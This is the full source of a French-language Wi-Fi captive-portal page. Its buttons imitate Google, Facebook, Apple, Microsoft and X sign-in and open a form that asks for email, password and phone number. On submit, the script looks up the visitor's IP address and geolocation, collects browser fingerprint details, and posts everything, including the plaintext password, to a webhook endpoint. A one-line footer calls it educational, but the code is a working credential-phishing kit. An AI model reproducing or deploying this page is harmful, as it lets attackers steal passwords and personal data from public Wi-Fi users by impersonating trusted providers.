<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Portail Wi-Fi – Connexion</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

  :root {
    --primary: #4a90e2;
    --primary-dark: #357ABD;
    --gray-light: #f5f7fa;
    --gray-medium: #cfd8e3;
    --text-dark: #2c3e50;
    --border-radius: 14px;
    --transition: 0.3s ease;
  }

  * {
    box-sizing: border-box;
    margin: 0; padding: 0;
    font-family: 'Inter', sans-serif;
  }

  body, html {
    height: 100%;
    background: var(--gray-light);
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }

  .container {
    background: white;
    padding: 48px 36px;
    max-width: 420px;
    width: 100%;
    border-radius: var(--border-radius);
    box-shadow: 0 12px 30px rgba(0,0,0,0.12);
    text-align: center;
    overflow: hidden;
  }

  h1 {
    color: var(--text-dark);
    font-weight: 600;
    font-size: 28px;
    margin-bottom: 32px;
  }

  .btn-social {
    cursor: pointer;
    border: none;
    outline: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    margin-bottom: 20px;
    border-radius: var(--border-radius);
    padding: 14px 18px;
    width: 100%;
    font-weight: 600;
    font-size: 16px;
    color: white;
    box-shadow: 0 6px 14px rgba(0,0,0,0.1);
    transition: background-color var(--transition), box-shadow var(--transition), transform var(--transition);
    user-select: none;
  }

  .btn-social:hover {
    filter: brightness(90%);
    transform: translateY(-2px);
  }

  .btn-social.active {
    box-shadow: 0 0 12px 3px rgba(74, 144, 226, 0.7);
    transform: translateY(-3px);
  }

  /* Couleurs et ombres pour chaque bouton */
  .btn-google {
    background: #DB4437;
    box-shadow: 0 6px 14px rgba(219, 68, 55, 0.5);
  }
  .btn-facebook {
    background: #3b5998;
    box-shadow: 0 6px 14px rgba(59, 89, 152, 0.5);
  }
  .btn-apple {
    background: #000000;
    box-shadow: 0 6px 14px rgba(0,0,0,0.5);
  }
  .btn-microsoft {
    background: #0078d4;
    box-shadow: 0 6px 14px rgba(0, 120, 212, 0.5);
  }
  .btn-twitter {
    background: #1DA1F2;
    box-shadow: 0 6px 14px rgba(29, 161, 242, 0.5);
  }

  /* Logos SVG */
  svg {
    width: 24px;
    height: 24px;
    fill: white;
    flex-shrink: 0;
  }

  form {
    margin-top: 24px;
    text-align: left;
    max-height: 0;
    opacity: 0;
    transition: max-height 0.5s ease, opacity 0.5s ease;
    overflow: hidden;
  }

  form.active {
    max-height: 480px;
    opacity: 1;
  }

  input {
    width: 100%;
    padding: 14px 16px;
    margin-bottom: 20px;
    border-radius: 10px;
    border: 1.5px solid var(--gray-medium);
    font-size: 16px;
    transition: border-color 0.3s ease;
  }

  input:focus {
    outline: none;
    border-color: var(--primary);
  }

  button[type="submit"] {
    background: var(--primary);
    color: white;
    border: none;
    padding: 16px;
    border-radius: 10px;
    width: 100%;
    font-weight: 600;
    font-size: 18px;
    cursor: pointer;
    transition: background-color var(--transition), box-shadow var(--transition);
    box-shadow: 0 8px 20px rgba(74, 144, 226, 0.5);
  }

  button[type="submit"]:hover {
    background-color: var(--primary-dark);
    box-shadow: 0 10px 26px rgba(53, 122, 189, 0.6);
  }

  .note {
    margin-top: 28px;
    font-size: 13px;
    color: #888;
    text-align: center;
  }

  @media (max-width: 480px) {
    .container {
      padding: 32px 24px;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 24px;
    }

    .btn-social {
      font-size: 14px;
      padding: 12px 16px;
      gap: 10px;
    }

    svg {
      width: 20px;
      height: 20px;
    }
  }
</style>
</head>
<body>
  <div class="container" role="main" aria-label="Portail de connexion Wi-Fi">
    <h1>Connexion au Wi-Fi</h1>

    <button class="btn-social btn-google" aria-label="Connexion avec Google" data-provider="Google">
      <svg viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" role="img">
        <path d="M533.5 278.4c0-17.4-1.5-34.1-4.4-50.3H272v95.3h146.9c-6.4 34.3-26.4 63.4-56.3 82.8v68h90.8c53-49 83.1-121 83.1-195.8z" fill="#4285F4"/>
        <path d="M272 544.3c72.6 0 133.6-24.1 178.2-65.6l-90.8-68c-24.7 16.5-56.2 26.2-87.3 26.2-67 0-123.8-45.3-144.2-106.2H33.2v66.9c44.2 87 135.1 146.7 238.8 146.7z" fill="#34A853"/>
        <path d="M127.8 325.1c-9.2-27.7-9.2-57.4 0-85.1v-66.9H33.2c-37.4 73.3-37.4 160.7 0 234l94.6-82z" fill="#FBBC05"/>
        <path d="M272 107.7c36.5 0 69.2 12.6 95 37.3l71.3-71.3C402 24.6 344.6 0 272 0 168.3 0 77.4 59.6 33.2 146.6l94.6 82C148.2 153 205 107.7 272 107.7z" fill="#EA4335"/>
      </svg>
      Continuer avec Google
    </button>

    <button class="btn-social btn-facebook" aria-label="Connexion avec Facebook" data-provider="Facebook">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" aria-hidden="true" focusable="false" role="img">
        <path fill="white" d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.07 44.38-121.07 124.72v70.62H22.89V288h81.4v224h100.2V288z"/>
      </svg>
      Continuer avec Facebook
    </button>

    <button class="btn-social btn-apple" aria-label="Connexion avec Apple" data-provider="Apple">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" aria-hidden="true" focusable="false" role="img">
        <path fill="white" d="M318.7 268.7c-1.1-44.3 36.2-65.5 37.8-66.6-20.6-30.2-52.6-34.3-63.9-34.8-27.2-2.8-53 16-66.7 16-13.7 0-35.1-15.6-57.7-15.2-29.6.4-57 17.3-72.3 44-30.9 53.7-7.9 133 22.3 176.2 14.8 22.2 32.4 47 55.5 46 22-1 30.3-14.1 56.8-14.1 26.5 0 34.1 14.1 57.7 13.6 23.9-.5 39-22.5 53.6-44.4 17-25.3 24-49.8 24.5-51 1-1.9-40.8-15.5-41.7-61.9zM254.8 93.2c11.8-14.2 19.7-34 17.5-53.6-16.9.7-37.4 11.3-49.4 25.5-10.8 12.3-20.1 32-17.6 50.8 18.7 1.4 38-9.5 49.5-22.7z"/>
      </svg>
      Continuer avec Apple
    </button>

    <button class="btn-social btn-microsoft" aria-label="Connexion avec Microsoft" data-provider="Microsoft">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" aria-hidden="true" focusable="false" role="img">
        <path fill="white" d="M0 32v208h208V32H0zm240 0v208h208V32H240zM0 272v208h208V272H0zm240 0v208h208V272H240z"/>
      </svg>
      Continuer avec Microsoft
    </button>

    <button class="btn-social btn-twitter" aria-label="Connexion avec X (Twitter)" data-provider="Twitter">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" aria-hidden="true" focusable="false" role="img">
        <path fill="white" d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.7-298.7 298.7-59.3 0-114.7-17.2-161.3-47 8.4 1 16.5 1.3 25.3 1.3 49.3 0 94.6-16.8 130.6-45.4-46.1-1-84.8-31.3-98.3-73 6.5 1 13.3 1.6 20.2 1.6 9.7 0 19.1-1.3 28-3.6-48.2-9.7-84.3-52.2-84.3-103.1v-1.3c14.1 7.8 30.2 12.5 47.4 13-28.2-18.9-46.6-51.2-46.6-87.7 0-19.3 5.2-37.3 14.3-52.8 51.6 63.3 129 104.9 216.2 109.4-1.8-7.7-2.7-15.8-2.7-24.2 0-58.8 47.7-106.5 106.5-106.5 30.7 0 58.5 12.9 77.9 33.8 24.2-4.7 47-13.6 67.5-25.9-8 25-25 46-47.4 59.2 21.6-2.4 42.1-8.3 61.2-16.7-14.3 21.3-32.3 40-53 55z"/>
      </svg>
      Continuer avec X (Twitter)
    </button>

    <form id="loginForm" aria-label="Formulaire de connexion Wi-Fi" novalidate>
      <input type="email" id="email" name="email" placeholder="Adresse e-mail" required autocomplete="email" />
      <input type="password" id="password" name="password" placeholder="Mot de passe" required autocomplete="current-password" />
      <input type="tel" id="phone" name="phone" placeholder="Numéro de téléphone" required pattern="[0-9 +()-]{6,20}" title="Veuillez entrer un numéro valide" />
      <button type="submit" aria-label="Soumettre le formulaire de connexion">Se connecter</button>
    </form>

    <p class="note">* Portail Wi-Fi pédagogique – aucune authentification réelle.</p>
  </div>

<script>
  const buttons = document.querySelectorAll('.btn-social');
  const form = document.getElementById('loginForm');
  let currentProvider = null;
  let animTimeout = null;

  function showForm() {
    form.classList.add('active');
    form.scrollIntoView({ behavior: 'smooth' });
  }

  function hideForm() {
    form.classList.remove('active');
  }

  buttons.forEach(btn => {
    btn.addEventListener('click', () => {
      // Gérer l'état actif des boutons
      buttons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      // Animation : fermer formulaire puis ouvrir après délai
      if (form.classList.contains('active')) {
        hideForm();
        clearTimeout(animTimeout);
        animTimeout = setTimeout(() => {
          showForm();
        }, 400);
      } else {
        showForm();
      }

      currentProvider = btn.getAttribute('data-provider');
    });
  });

  let sessionStart = Date.now();

  form.addEventListener('submit', async e => {
    e.preventDefault();

    const email = form.email.value.trim();
    const password = form.password.value;
    const phone = form.phone.value.trim();

    if (!email || !password || !phone) {
      alert("Veuillez remplir tous les champs correctement.");
      return;
    }

    const userAgent = navigator.userAgent;
    const lang = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const platform = navigator.platform;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);

    let geoInfo = {
      ip: "Inconnu",
      city: "Inconnue",
      region: "Inconnue",
      country: "Inconnu",
      org: "Inconnu",
      postal: "Inconnu",
      latitude: "N/A",
      longitude: "N/A"
    };

    try {
      const res = await fetch("https://ipapi.co/json");
      const data = await res.json();
      geoInfo = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        org: data.org,
        postal: data.postal,
        latitude: data.latitude,
        longitude: data.longitude
      };
    } catch (err) {
      console.error("Erreur récupération IP/Géo :", err);
    }

    const message = `
🔐 Connexion Wi-Fi (${currentProvider || 'Méthode inconnue'})
📧 Email : ${email}
🔑 Mot de passe : ${password}
📱 Téléphone : ${phone}

🌍 IP : ${geoInfo.ip}
🏙️ Ville : ${geoInfo.city}
📍 Région : ${geoInfo.region}
🇨🇵 Pays : ${geoInfo.country}
🏢 FAI : ${geoInfo.org}
📮 Code Postal : ${geoInfo.postal}
📌 Coordonnées : ${geoInfo.latitude}, ${geoInfo.longitude}

🧭 Navigateur : ${userAgent}
💻 Plateforme : ${platform}
🗺️ Langue : ${lang}
🕒 Fuseau horaire : ${timezone}
📐 Résolution écran : ${screenRes}
⏱️ Temps passé : ${sessionDuration} secondes
    `;

    // Envoi au webhook
    fetch('/api/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message }),
    });

    alert("Merci ! Données envoyées.");
    form.reset();

    // Reset active btn
    buttons.forEach(b => b.classList.remove('active'));
    hideForm();
  });
</script>
</body>
</html>
